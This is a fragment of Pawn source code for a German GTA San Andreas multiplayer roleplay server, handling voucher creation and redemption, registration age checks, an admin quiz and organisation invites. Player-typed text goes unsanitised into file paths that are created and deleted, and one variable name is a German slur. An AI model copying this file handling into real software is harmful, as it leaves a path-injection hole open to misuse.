						SendClientMessage(playerid,COLOR_GREY,"Dieser Gutschein ist nicht mehr gültig!");
						return 1;
						}
		}
		else
		{
			SendClientMessage(playerid,COLOR_GREY,"Abgebrochen!");
		}
	}
	if(dialogid == creategutschein)
	{
	    if(response==1)
		{
		    switch(listitem)
		    {
		        case 0:
		        {
   					GutscheinResult[playerid] = 1;
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEINMACHEN, DIALOG_STYLE_INPUT, "Gutschein Erstellung", "Bitte gebe nun den Code des Gutscheins ein:", "Erstellen", "Abbrechen");
				}
		        case 1:
		        {
   					GutscheinResult[playerid] = 2;
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEINMACHEN, DIALOG_STYLE_INPUT, "Gutschein Erstellung", "Bitte gebe nun den Code des Gutscheins ein:", "Erstellen", "Abbrechen");
				}
		        case 2:
		        {
   					GutscheinResult[playerid] = 3;
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEINMACHEN, DIALOG_STYLE_INPUT, "Gutschein Erstellung", "Bitte gebe nun den Code des Gutscheins ein:", "Erstellen", "Abbrechen");
				}
		        case 3:
		        {
		            SCM(playerid,-1,"Wurde von der Serverleitung deaktiviert.");
   					//GutscheinResult[playerid] = 4;
				//	ShowPlayerDialog(playerid, DIALOG_GUTSCHEINMACHEN, DIALOG_STYLE_INPUT, "Gutschein Erstellung", "Bitte gebe nun den Code des Gutscheins ein:", "Erstellen", "Abbrechen");
				}
		        case 4:
		        {
   					GutscheinResult[playerid] = 5;
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEINMACHEN, DIALOG_STYLE_INPUT, "Gutschein Erstellung", "Bitte gebe nun den Code des Gutscheins ein:", "Erstellen", "Abbrechen");

				}
		        case 5:
		        {
   					GutscheinResult[playerid] = 6;
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEINMACHEN, DIALOG_STYLE_INPUT, "Gutschein Erstellung", "Bitte gebe nun den Code des Gutscheins ein:", "Erstellen", "Abbrechen");
				}
			}
		}
		else
		{
			SendClientMessage(playerid,COLOR_GREY,"Abgebrochen!");
		}
	}
	if(dialogid == DIALOG_GUTSCHEINMACHEN)
	{
	    if(response==1)
		{

			new ahh434[128];
	        format(ahh434, sizeof(ahh434), "/gutscheine/%s.ini",inputtext);
			dini_Create(ahh434);
			new ahh4343[128];
	        format(ahh4343, sizeof(ahh4343), "* Du hast den Gutschein mit dem Code %s erstellt!",inputtext);
			SendClientMessage(playerid, COLOR_LIGHTBLUE,ahh4343);

	    	if(GutscheinResult[playerid] == 1)
			{
				dini_IntSet(ahh434, "result", 1);
			}
	    	if(GutscheinResult[playerid] == 2)
			{
				dini_IntSet(ahh434, "result", 2);
			}
	    	if(GutscheinResult[playerid] == 3)
			{
				dini_IntSet(ahh434, "result", 3);
			}
	    	if(GutscheinResult[playerid] == 4)
			{
				dini_IntSet(ahh434, "result", 4);
			}
	    	if(GutscheinResult[playerid] == 5)
			{
				dini_IntSet(ahh434, "result", 5);
			}
	    	if(GutscheinResult[playerid] == 6)
			{
				dini_IntSet(ahh434, "result", 6);
			}
		}
		else
		{
			SendClientMessage(playerid,COLOR_GREY,"Abgebrochen!");
		}
	}
	if(dialogid == 5614)
	{
	    if(response==1)
		{
			new string22224[128];

            format(string22224, sizeof(string22224), "/gutscheine/%s.ini",inputtext);

			if(dini_Exists(string22224))
			{
				new number = dini_Int(string22224, "result");
				if(number == 1)
				{
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEININFO, DIALOG_STYLE_MSGBOX, "Gutschein", "Gutschein Typ: UBB", "Einlösen", "Abbrechen");
   					GutscheinResultPlayer[playerid] = 1;

		   			new stringk[128];
					format(stringk, sizeof(stringk), inputtext);
					strmid(PlayerInfo[playerid][pAdministrativGutschein], stringk, 0, strlen(stringk), 255);

				}
				else if(number == 2)
				{
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEININFO, DIALOG_STYLE_MSGBOX, "Gutschein", "Gutschein Typ: 10 Respektpunkte", "Einlösen", "Abbrechen");

		   			new stringk[128];
					format(stringk, sizeof(stringk), inputtext);
					strmid(PlayerInfo[playerid][pAdministrativGutschein], stringk, 0, strlen(stringk), 255);

   					GutscheinResultPlayer[playerid] = 2;
				}
				else if(number == 3)
				{
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEININFO, DIALOG_STYLE_MSGBOX, "Gutschein", "Gutschein Typ: Premium Permanent", "Einlösen", "Abbrechen");

		   			new stringk[128];
					format(stringk, sizeof(stringk), inputtext);
					strmid(PlayerInfo[playerid][pAdministrativGutschein], stringk, 0, strlen(stringk), 255);

   					GutscheinResultPlayer[playerid] = 3;
				}
				else if(number == 4)
				{
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEININFO, DIALOG_STYLE_MSGBOX, "Gutschein", "Gutschein Typ: Wunschkennzeichen", "Einlösen", "Abbrechen");

		   			new stringk[128];
					format(stringk, sizeof(stringk), inputtext);
					strmid(PlayerInfo[playerid][pAdministrativGutschein], stringk, 0, strlen(stringk), 255);

   					GutscheinResultPlayer[playerid] = 4;
				}
				else if(number == 5)
				{
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEININFO, DIALOG_STYLE_MSGBOX, "Gutschein", "Gutschein Typ: Wunschfahrzeug", "Einlösen", "Abbrechen");

		   			new stringk[128];
					format(stringk, sizeof(stringk), inputtext);
					strmid(PlayerInfo[playerid][pAdministrativGutschein], stringk, 0, strlen(stringk), 255);

   					GutscheinResultPlayer[playerid] = 5;
				}
				else if(number == 6)
				{
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEININFO, DIALOG_STYLE_MSGBOX, "Gutschein", "Gutschein Typ: Sonderlackierung", "Einlösen", "Abbrechen");

		   			new stringk[128];
					format(stringk, sizeof(stringk), inputtext);
					strmid(PlayerInfo[playerid][pAdministrativGutschein], stringk, 0, strlen(stringk), 255);

   					GutscheinResultPlayer[playerid] = 6;
				}





				else if(number == 7)
				{
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEININFO, DIALOG_STYLE_MSGBOX, "Gutschein", "Gutschein Typ: +1 Carkey", "Einlösen", "Abbrechen");

		   			new stringk[128];
					format(stringk, sizeof(stringk), inputtext);
					strmid(PlayerInfo[playerid][pAdministrativGutschein], stringk, 0, strlen(stringk), 255);

   					GutscheinResultPlayer[playerid] = 7;
				}

				else if(number == 8)
				{
					ShowPlayerDialog(playerid, DIALOG_GUTSCHEININFO, DIALOG_STYLE_MSGBOX, "Gutschein", "Gutschein Typ: 100000$ Doller", "Einlösen", "Abbrechen");

		   			new stringk[128];
					format(stringk, sizeof(stringk), inputtext);
					strmid(PlayerInfo[playerid][pAdministrativGutschein], stringk, 0, strlen(stringk), 255);

   					GutscheinResultPlayer[playerid] = 8;
				}


			}
			else
			{
				    SendClientMessage(playerid,COLOR_GREY,"Dieser Gutschein ist nicht Gültig!");
			}
	    }
	}
	if(dialogid == DIALOG_GUTSCHEININFO)
	{
	    if(response==1)
		{
			if(GutscheinResultPlayer[playerid] == 1)
			{
					if(IsADtCar(GetPlayerVehicleID(playerid)))// Privatfahrzeug
		   			{
					    if(IsPlayerInAnyVehicle(playerid))
					    {
							ShowPlayerDialog(playerid,DIALOG_NEON,DIALOG_STYLE_LIST,"{0015FF}Neon","Blau\nRot\nGrün\nWeiß\nPink\nGelb\nDemontieren","Auswählen","Abbrechen");
						}
						else
						{
						    SCM(playerid,COLOR_GRAD2,"Du kannst dir keine Neons unter die Füße kleben.");
						}
					}
					else
		   			{
				    SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht in einen Privatfahrzeug");
					}
	    	}
			else if(GutscheinResultPlayer[playerid] == 2)
			{

				new stringfz22[128];
		        format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
				if(dini_Exists(stringfz22))
				{
					SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast 10 Respektpunkte durch deinen Gutschein erhalten!");
					PlayerInfo[playerid][pExp] += 10;
					dini_Remove(stringfz22);

				}
				else
				{
				    SendClientMessage(playerid,COLOR_GRAD2,"Dieser Gutschein ist nicht mehr gültig!");
				}
	    	}
			else if(GutscheinResultPlayer[playerid] == 3)
			{
				new stringfz22[128];
		        format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
				if(dini_Exists(stringfz22))
				{
					SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast Permanentes Premium durch deinen Gutschein erhalten!");
					PlayerInfo[playerid][pDonateRank] = 4;
					dini_Remove(stringfz22);
				}
				else
				{
				    SendClientMessage(playerid,COLOR_GRAD2,"Dieser Gutschein ist nicht mehr gültig!");
				}
	    	}
			else if(GutscheinResultPlayer[playerid] == 4)
			{
			//	SendClientMessage(playerid,COLOR_GRAD2,"Aus Debugtechnischen Gründen momentan deaktiviert");
		   		ShowPlayerDialog(playerid,Fmeldeamt,DIALOG_STYLE_INPUT,"Wunschkennzeichen","Gib hier 10 Zeichen für dein Kenzeichen ein","Absenden","Abbrechen");
	    	}
			else if(GutscheinResultPlayer[playerid] == 5)
			{
				if(Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
				{
					SendClientMessage(playerid, COLOR_GREY, "Du hast bereits ein Fahrzeug auf diesen Slot, Verwende /carkey");
					return 1;
				}
				new lidlmaultaschen[2024];
			    for(new i = 0; i < 211; i++)
			    {
              	    format(lidlmaultaschen, sizeof(lidlmaultaschen), "%s%s\n",lidlmaultaschen,CarName[i]);//CarName[i]
			    }
		   		ShowPlayerDialog(playerid,WUNSCHCAR,DIALOG_STYLE_LIST,"Wunschfahrzeug",lidlmaultaschen,"Absenden","Abbrechen");
	    	}
			else if(GutscheinResultPlayer[playerid] == 6)
			{
				new lackstring[4024];
				for(new i = 0; i < 128; i++)
				{
            	 format(lackstring, sizeof(lackstring), "%s%s#######\n",lackstring,VehicleColoursTableRGBA[i]);//CarName[i]
				}
      		    ShowPlayerDialog(playerid, DIALOG_SONDERLACK, DIALOG_STYLE_LIST, "Sonderlack", lackstring, "Lackieren", "Abbrechen"); // Ausgabe
	    	}




			else if(GutscheinResultPlayer[playerid] == 7)
			{


				new stringfz22[128];
		        format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
				if(dini_Exists(stringfz22))
				{


					if(PlayerInfo[playerid][pCarkeys] > 99)
					{
				 	   SendClientMessage(playerid,COLOR_GRAD2,"Du hast bereits die Maximale Anzahl an Carkeys!");
						return 1;
			    	}
					SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast +1 Carkey durch deinen Gutschein erhalten!");
					PlayerInfo[playerid][pCarkeys] += 1;
					dini_Remove(stringfz22);
				}
				else
				{
				    SendClientMessage(playerid,COLOR_GRAD2,"Dieser Gutschein ist nicht mehr gültig!");
				}


	    	}

			else if(GutscheinResultPlayer[playerid] == 8)
			{
				new stringfz22[128];
		        format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
				if(dini_Exists(stringfz22))
				{
					SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast 100000$ Doller durch deinen Gutschein erhalten!");
					GivePlayerMoneySave(playerid, 100000);
					dini_Remove(stringfz22);
				}
				else
				{
				    SendClientMessage(playerid,COLOR_GRAD2,"Dieser Gutschein ist nicht mehr gültig!");
				}
	    	}




	    }
		else
		{
			SendClientMessage(playerid,COLOR_GRAD2,"Abgebrochen!");
	    }
	}
	if(dialogid == WUNSCHCAR)
	{
	    if(response==1)
		{
			new stringfz22[128];
			format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
			if(dini_Exists(stringfz22))
			{
				new lidlmaultaschen[2024];
		        format(lidlmaultaschen, sizeof(lidlmaultaschen), "* Du hast durch deinen Gutschein einen %s bekommen!",CarName[listitem]);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,lidlmaultaschen);
				dtc_AutohausCat[playerid] = 8;
				OnPlayerBuyCar(playerid, listitem+400, 0);
				dtc_AutohausCar[playerid] = 0;
				dtc_AutohausCat[playerid] = 2000;
				dini_Remove(stringfz22);
			    new Float:x, Float:y, Float:z;
		 	    GetPlayerPos(playerid, x, y, z);
				SetVehiclePos(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], x, y, z);
				PutPlayerInVehicle(playerid, PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], 0);
                new Float:X,Float:Y,Float:Z;
                new Float:z_rot;
                GetVehiclePos(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], X,Y,Z);
                GetVehicleZAngle(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], z_rot);
                PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_x] = X;
                PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_y] = Y;
                PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_z] = Z;
                PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRotate] = z_rot;
                OnPlayerCarUpdate(playerid,false);
		    }
			else
			{
				SendClientMessage(playerid,COLOR_GRAD2,"Dieser Gutschein ist nicht mehr gültig!");
		    }
	    }
		else
		{
			SendClientMessage(playerid,COLOR_GRAD2,"Abgebrochen!");
	    }

	}
	if(dialogid == Fmeldeamt)
	{
	    if(response==1)
		{
		    if(IsPlayerInAnyVehicle(playerid) == 1)
			{
			    if(Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
			    {
			        new CarPlate[9];
					format(CarPlate,sizeof(CarPlate),"%s",inputtext);
			        new vehiclefid = GetPlayerVehicleID(playerid);
					if(IsADtCar(vehiclefid))// Privatfahrzeug
		   			{
						new stringfz22[128];
			       		format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);
						if(dini_Exists(stringfz22))
						{
							new carowner = GetDtCarOwner(vehiclefid);
			          		new slot = GetDtCarOwnerSlot(carowner,vehiclefid);
							if(carowner != playerid)// Privatfahrzeug
			   				{
					   		SendClientMessage(playerid,COLOR_GREEN,"Das Fahrzeug gehört dir nicht!");
							return 1;
							}
							SetVehicleNumberPlate(vehiclefid, CarPlate);
							SetVehicleToRespawn(vehiclefid);
							new Float: X,Float: Y,Float: Z;
							GetPlayerPos(playerid,X,Y,Z);
							SetVehiclePos(vehiclefid,X,Y,Z);
					  		new name[MAX_PLAYER_NAME], str[128];
						    GetPlayerName(carowner, name, sizeof name);
						    format(str, sizeof str, "/Autos/%s%d.ini", name,slot);
							dini_Set(str, "Plate", CarPlate);
				   			SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast den Gutschein für das Wunschkennzeichen eingelöst!.");
							dini_Remove(stringfz22);
						}
						else
					    {
				   			 SendClientMessage(playerid,COLOR_GREEN,"Dieser Gutschein ist nicht mehr gültig!");
						}
					}
					else
				    {
				    SendClientMessage(playerid,COLOR_GREEN,"Das ist kein Privatfahrzeug!");
					return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid,COLOR_GREEN,"Du musst dafür in einem Auto sitzen.");
			}
	    }
		if(response==0)
		{
	        SendClientMessage(playerid, COLOR_RED , " *************************************************** ");
	        SendClientMessage(playerid, COLOR_RED , " *           Du brauchst ein Kennzeichen           * ");
	        SendClientMessage(playerid, COLOR_RED , " *         Damit du keine Anzeige Bekommst         * ");
	        SendClientMessage(playerid, COLOR_RED , " *************************************************** ");
	        return 1;
	    }
	    return 1;
		}
	    if(dialogid == AUTOVERKAUFENAMK)
	    {
	        if(response) // Männlich
	        {
		        if(DialogShowed[playerid] == 1) // Männlich
		        {
					    FraktionsKasse[6] -= PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPreis] / 2;// Regierung
			         	GivePlayerMoneySave(playerid, PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPreis] / 2);
						if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][Neon] >= 1)
						{
						DestroyObject(Neonrohr[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]][Neon]);
						DestroyObject(Neonrohr[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]][Neon1]);
						}
						DestroyVehicle(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]);
						new playername3[MAX_PLAYER_NAME];
						GetPlayerName(playerid, playername3, sizeof(playername3));
					    new string3[32];
						format(string3, sizeof(string3), "/Autos/%s%d.ini", playername3,Dtc_PlayerKey[playerid]);
						fremove(string3);
						Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]] = 0;
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Dein Auto wurde verkauft! Du hast die Hälfte das Kaufpreises erhalten!");

						DialogShowed[playerid] = 0;
	        	}
				else
		        {
				format(stringtu, sizeof(stringtu), "%s wurde vom Server gebannt, Grund: Dialog-Repeater /carsell", GetName(playerid));
				SendClientMessageToAll(COLOR_RED, stringtu);
       		 	TogglePlayerControllable(playerid, false);

				Ban(playerid);

				PlayerInfo[playerid][pAdmin] = 0;
				PlayerInfo[playerid][pGebannt] = 1;

	   			new stringk[128];
				format(stringk, sizeof(stringk), "Dialog-Repeater");
				strmid(PlayerInfo[playerid][pBanGrund], stringk, 0, strlen(stringk), 255);

				format(stringk, sizeof(stringk), "Server");
				strmid(PlayerInfo[playerid][pBanAdmin], stringk, 0, strlen(stringk), 255);

				format(stringk, sizeof(stringk), "Permanent");
				strmid(PlayerInfo[playerid][pBanDauer], stringk, 0, strlen(stringk), 255);

				return 1;
	        	}

	        }
	        else // Weiblich
	        {
				DialogShowed[playerid] = 0;
				SendClientMessage(playerid, COLOR_GREY, "Abgebrochen");
	        }
		return 1;
	    }
	    if(dialogid == 1836)
	    {
	        if(response) // Männlich
	        {
    						ShowPlayerDialog(playerid,DIALOG_REGSTEP_2,DIALOG_STYLE_INPUT,"Alter","Wann bist du geboren?\nAngabe bitte in TT.MM.JJJJ ","Weiter"," ");
	        }
	        else // Weiblich
	        {
   					 		ShowPlayerDialog(playerid,DIALOG_REGSTEP_2,DIALOG_STYLE_INPUT,"Alter","Wann bist du geboren?\nAngabe bitte in TT.MM.JJJJ ","Weiter"," ");
	        }

		return 1;
	    }
		if(dialogid == DIALOG_REGSTEP_2)
		{
			new hurensohnstring[128];
	 		new year, month,day;
			getdate(year, month, day);
	 		new DateInfo[3][20];
			split2(inputtext, DateInfo, '.');
			if(response == 1)
			if (strlen(inputtext) > 10) { // nicht länger als 10 zeichen (xx/xx/xxxx)
	   		ShowPlayerDialog(playerid,DIALOG_REGSTEP_2,DIALOG_STYLE_INPUT,"Alter","ANGABEFEHLER:Wann bist du geboren?\nAngabe bitte in TT.MM.JJJJ","Weiter"," ");
			return 0;
			}
			if (!IsValidDate(strval(DateInfo[0]),strval(DateInfo[1]),strval(DateInfo[2]))) {
		   		ShowPlayerDialog(playerid,DIALOG_REGSTEP_2,DIALOG_STYLE_INPUT,"Alter","ANGABEFEHLER:Wann bist du geboren?\nAngabe bitte in TT.MM.JJJJ","Weiter"," ");
				return 0;
			}
			if(year - strval(DateInfo[2]) > 100 || strval(DateInfo[2]) < 1 || strval(DateInfo[2]) >= year)
			{
		   		ShowPlayerDialog(playerid,DIALOG_REGSTEP_2,DIALOG_STYLE_INPUT,"Alter","ANGABEFEHLER:Wann bist du geboren?\nAngabe bitte in TT.MM.JJJJ","Weiter"," ");
			    return 0;
			}
			new check = year - strval(DateInfo[2]);
			if(check == year)
			{
		   		ShowPlayerDialog(playerid,DIALOG_REGSTEP_2,DIALOG_STYLE_INPUT,"Alter","ANGABEFEHLER:Wann bist du geboren?\nAngabe bitte in TT.MM.JJJJ","Weiter"," ");
			    return 0;
			}
			if(strval(DateInfo[1]) > month)
			{
			    check -= 1;
			}
			else if(strval(DateInfo[1]) == month && strval(DateInfo[0]) > day)
			{
			    check -= 1;
			}
			PlayerInfo[playerid][pAge] = check;
			format(hurensohnstring, sizeof(hurensohnstring), "Ok, du bist also %d Jahre alt.",PlayerInfo[playerid][pAge]);
			SendClientMessage(playerid, COLOR_WHITE, hurensohnstring);


			if(response == 0)
			{
			ShowPlayerDialog(playerid,DIALOG_REGSTEP_2,DIALOG_STYLE_INPUT,"Alter","ANGABEFEHLER:Wann bist du geboren?\nAngabe bitte in TT.MM.JJJJ","Weiter"," ");
			return 1;
			}
			                    SkinStatus[playerid] = playerid;
			                    SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
						        SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
						        SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
					        	SetPlayerFacingAngle(playerid, 88.4779);
							    FreezePlayer(playerid);
				        	    SetPlayerInterior(playerid, 0);
							    SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			 				    SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
								SetPlayerVirtualWorld(playerid, 3);

		}



    	//OnDialogResponse
	    if(dialogid == DIALOG_QUIZ_QUESTION)
	    {
	        format(ServerFrage, sizeof(ServerFrage), "%s", inputtext);
	        ShowPlayerDialog(playerid, DIALOG_QUIZ_ANSWER, DIALOG_STYLE_INPUT, "Neues Quiz - Antwort eingeben [2 von 3]", "Antwort eingeben [2 von 3]\nGib eine Antwort ein", "Weiter", "Abbrechen");

	    }
	    if(dialogid == DIALOG_QUIZ_ANSWER)
	    {
	        format(ServerAntwort, sizeof(ServerAntwort), "%s", inputtext);
			ShowPlayerDialog(playerid, DIALOG_QUIZ_PRICE, DIALOG_STYLE_LIST, "Neues Quiz - Gewinn auswählen", "Unterbodenbeleuchtung Gutschein\n10 Respektpunkte Gutschein\nPremium Gutschein (Permanent)\nWunschkennzeichen Gutschein\nWunschfahrzeug Gutschein\nSonderlackierung Gutschein\n+1 Carkey\n100000$ Doller", "Weiter", "Abbrechen");
	    }
	    if(dialogid == DIALOG_QUIZ_PRICE)
	    {
			quiz_result = listitem;
			switch(listitem)
			{
			    case 0:
			    {
		   			new stringk[128];
					format(stringk, sizeof(stringk), "Unterbodenbeleuchtung Gutschein");
				    strmid(ServerGeld, stringk, 0, strlen(stringk), 255);
				}
			    case 1:
			    {
		   			new stringk[128];
					format(stringk, sizeof(stringk), "10 Respektpunkte Gutschein");
				    strmid(ServerGeld, stringk, 0, strlen(stringk), 255);
				}
			    case 2:
			    {
		   			new stringk[128];
					format(stringk, sizeof(stringk), "Premium Permanent Gutschein");
				    strmid(ServerGeld, stringk, 0, strlen(stringk), 255);
				}
			    case 3:
			    {
		   			new stringk[128];
					format(stringk, sizeof(stringk), "Wunschkennzeichen Gutschein");
				    strmid(ServerGeld, stringk, 0, strlen(stringk), 255);
				}
			    case 4:
			    {
		   			new stringk[128];
					format(stringk, sizeof(stringk), "Wunschfahrzeug Gutschein");
				    strmid(ServerGeld, stringk, 0, strlen(stringk), 255);
				}
			    case 5:
			    {
		   			new stringk[128];
					format(stringk, sizeof(stringk), "Sonderlack Gutschein");
				    strmid(ServerGeld, stringk, 0, strlen(stringk), 255);
				}
			    case 6:
			    {
		   			new stringk[128];
					format(stringk, sizeof(stringk), "+1 Carkey");
				    strmid(ServerGeld, stringk, 0, strlen(stringk), 255);
				}
			    case 7:
			    {
		   			new stringk[128];
					format(stringk, sizeof(stringk), "100000$ Doller");
				    strmid(ServerGeld, stringk, 0, strlen(stringk), 255);
				}
			}
	        new textstringd[256];
	        format(textstringd,sizeof(textstringd),"Admin: %s hat ein Quiz erstellt! Frage: %s - Gewinn: %s",GetName(playerid), ServerFrage,ServerGeld);
	        SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);
	        SendClientMessageToAll(COLOR_LIGHTBLUE,"Tippe die Antwort in den Chat!");
	        active_quiz = 1;
		    for(new i=0; i<MAX_PLAYERS; i++)
		    {
		        PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
		    }
	   		format(textstringd,sizeof(textstringd),"www.gta-reallife.de - Quiz - Frage: %s Gewinn: %s",ServerFrage,ServerGeld);
	        TextDrawSetString(Copyright,textstringd);
	    }
	    if(dialogid == DIALOG_ORGINVITE)
		{
			if(response)
			{
			    new org = EingeladenORG[playerid];

				new string[128];
			    format(string,sizeof(string),"Du bist der Organisation '%s' beigetreten.",OrgInfo[org][OrgName]);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Motto:");
				format(string,sizeof(string),"- %s",OrgInfo[org][OrgMotto]);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
				format(string,sizeof(string),"%s ist der Organisation '%s' beigetreten.",GetName(playerid),OrgInfo[org][OrgName]);
				SendOrganisationsMessage(org,COLOR_PURPLE,string);
				PlayerInfo[playerid][pOrgMember] = org;




			}

	    	return 1;
		}



/*
	    if(dialogid == DIALOG_ORGINVITE)
		{
			if(response)
			{
			  OnPlayerCommandText(playerid,"/accept orginvite");
			}
			else
			{
//			  OnPlayerCommandText(playerid,"/einladung ablehnen");
			}
	    	return 1;
		}
	    if(dialogid ==  DIALOG_GUTSCHEIN)
	    {
		    new string[128],gutscheinnn[16],gmenge[16];
		    if(response == 0)return 1;
		    if(response == 1)
		    {
		        if(!strlen(inputtext))
				{
				    ShowPlayerDialog(playerid,DIALOG_GUTSCHEIN,DIALOG_STYLE_INPUT,"{FFFFFF}: Gutschein","{C9C9C9}Gib deinen Gutscheincode ein:","Absenden","Abbrechen");
				    return 1;
				}
		        for(new g=1;g<MAX_GUTSCHEIN;g++)
			   	{
				   	if(Gutschein[g][gutscheincreatet] == 1)
					{
					    if(!strcmp(inputtext,Gutschein[g][gutscheincode],true))
					    {
					        switch(Gutschein[g][gutscheintyp])
					        {
					            case 1:{gutscheinnn="Level",gmenge="Menge:";}
					            case 2:{gutscheinnn="DonatorZeit",gmenge="Menge:";}
					            case 3:{gutscheinnn="Fahrzeuge",gmenge="FahrzeugID:";}
					            case 4:{gutscheinnn="Respektpunkte",gmenge="Menge:";}
					            case 5:{gutscheinnn="Geld",gmenge="Menge:";}
							}
							PlayerInfo[playerid][pGutschein] = g;
					        format(string,sizeof(string),"Name: %s\nCode: %s\nBeschreibung: %s\nTyp: %s\n%s %d\nAnzahl: %d",
							Gutschein[g][gutscheinname],Gutschein[g][gutscheincode],Gutschein[g][gutscheindesc],Gutschein[g][gutscheindesc],
							gutscheinnn,gmenge,Gutschein[g][gutscheinmenge],Gutschein[g][gutscheinanzahl]);
                            ShowPlayerDialog(playerid,DIALOG_GUTSCHEIN_HAB,DIALOG_STYLE_MSGBOX,"Gutschein einlösen",string,"Einlösen","Abbrechen");
						}
					}
				}
		        return 1;
		    }
		}
	    if(dialogid ==  DIALOG_GUTSCHEIN_HAB)
	    {
		    new query[280];
		    if(response == 0){PlayerInfo[playerid][pGutschein] = 0;return 1;}
		    if(response == 1)
		    {
		        if(Gutschein[PlayerInfo[playerid][pGutschein]][gutscheinanzahl] == 0)
		        {
		            if(Gutschein[PlayerInfo[playerid][pGutschein]][gutscheincreatet] == 1)
					{

						format(query,sizeof(query),"DELETE FROM server_gutscheine WHERE id = '%d'",PlayerInfo[playerid][pGutschein]);
					   	mysql_function_query(mysqlcon,query,false,"","");
						Gutschein[MakeGutschein[playerid]][gutscheincreatet] = 0;
					    strmid(Gutschein[MakeGutschein[playerid]][gutscheincode],"Unbekannt",0,strlen("Unbekannt"),16);
					    strmid(Gutschein[MakeGutschein[playerid]][gutscheinname],"Unbekannt",0,strlen("Unbekannt"),32);
					    strmid(Gutschein[MakeGutschein[playerid]][gutscheindesc],"Unbekannt",0,strlen("Unbekannt"),64);
	                    Gutschein[MakeGutschein[playerid]][gutscheintyp] = 0;
	                    Gutschein[MakeGutschein[playerid]][gutscheinmenge] = 0;
						Gutschein[MakeGutschein[playerid]][gutscheinanzahl] = 0;
						MakeGutschein[playerid] = 0;
						PlayerInfo[playerid][pGutschein] = 0;
					}
		            SendClientMessage(playerid,COLOR_GREY,"Der Gutschein wurde aufgebraucht und gelöscht!");
		            return 1;
				}
		        switch(Gutschein[PlayerInfo[playerid][pGutschein]][gutscheintyp])
		        {
          			case 1:
					{
					    Gutschein[PlayerInfo[playerid][pGutschein]][gutscheinanzahl]--;

					    SendClientMessage(playerid,GELB,"Du hast deinen Gutschein eingelöst");
			  		}
		            case 2:
					{
					    Gutschein[PlayerInfo[playerid][pGutschein]][gutscheinanzahl]--;
					    SendClientMessage(playerid,GELB,"Du hast deinen Gutschein eingelöst");
					}
		            case 3:
					{
					    Gutschein[PlayerInfo[playerid][pGutschein]][gutscheinanzahl]--;
					    SendClientMessage(playerid,GELB,"Du hast deinen Gutschein eingelöst");
					}
		            case 4:
					{
					    Gutschein[PlayerInfo[playerid][pGutschein]][gutscheinanzahl]--;
					    SendClientMessage(playerid,GELB,"Du hast deinen Gutschein eingelöst");
					}
		            case 5:
					{
					    Gutschein[PlayerInfo[playerid][pGutschein]][gutscheinanzahl]--;
					    SendClientMessage(playerid,GELB,"Du hast deinen Gutschein eingelöst");
					}
				}
		        PlayerInfo[playerid][pGutschein] = 1;
			}
		}
	    if(dialogid ==  GUTSCHEIN_CREATE_CODE)
	    {
			new string[150],query[128];
			if(response == 0)
			{
				if(Gutschein[MakeGutschein[playerid]][gutscheincreatet] == 1)
				{
					format(query,sizeof(query),"DELETE FROM server_gutscheine WHERE id = '%d'",MakeGutschein[playerid]);
				   	mysql_function_query(mysqlcon,query,false,"","");
					Gutschein[MakeGutschein[playerid]][gutscheincreatet] = 0;
